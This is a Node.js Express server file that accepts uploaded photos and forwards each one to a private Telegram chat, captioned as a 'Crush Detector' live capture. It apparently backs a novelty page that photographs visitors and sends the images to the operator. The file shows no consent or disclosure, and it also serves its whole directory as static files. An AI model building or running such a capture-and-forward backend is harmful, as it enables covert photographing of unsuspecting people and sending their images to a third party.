const express = require("express");
const multer = require("multer");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Simple multer setup
const upload = multer({ storage: multer.memoryStorage() });

// Serve static files
app.use(express.static(__dirname));

// Photo upload endpoint
app.post("/api/send-photo", upload.single("photo"), async (req, res) => {
    console.log("📸 Photo request received");

    if (!req.file) {
        console.log("❌ No file received");
        return res.status(400).json({ error: "No photo file" });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    console.log("🔑 Bot Token:", botToken ? "Present" : "Missing");
    console.log("💬 Chat ID:", chatId ? "Present" : "Missing");

    if (!botToken || !chatId) {
        console.log("❌ Missing credentials");
        return res.status(500).json({ error: "Missing Telegram credentials" });
    }

    try {
        // Simple FormData approach
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", new Blob([req.file.buffer]), "capture.jpg");
        formData.append("caption", "📸 Crush Detector Photo - Live Capture!");

        console.log("🚀 Sending to Telegram API...");

        const response = await fetch(
            `https://api.telegram.org/bot${botToken}/sendPhoto`,
            {
                method: "POST",
                body: formData,
            },
        );

        const result = await response.text();
        console.log("📱 Telegram Response:", result);

        if (response.ok) {
            console.log("✅ SUCCESS - Photo sent to Telegram!");
            res.json({ success: true, message: "Photo sent successfully" });
        } else {
            console.log("❌ FAILED - Telegram API Error:", result);
            res.status(500).json({
                error: "Telegram API failed",
                details: result,
            });
        }
    } catch (error) {
        console.error("💥 CATCH ERROR:", error.message);
        res.status(500).json({ error: "Server error", details: error.message });
    }
});

// Health check endpoint
app.get("/api/health", (req, res) => {
    res.json({
        status: "OK",
        telegram: {
            botToken: !!process.env.TELEGRAM_BOT_TOKEN,
            chatId: !!process.env.TELEGRAM_CHAT_ID,
        },
    });
});

// Default route
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(
        `🤖 Bot configured: ${process.env.TELEGRAM_BOT_TOKEN ? "YES" : "NO"}`,
    );
    console.log(
        `💬 Chat configured: ${process.env.TELEGRAM_CHAT_ID ? "YES" : "NO"}`,
    );
});
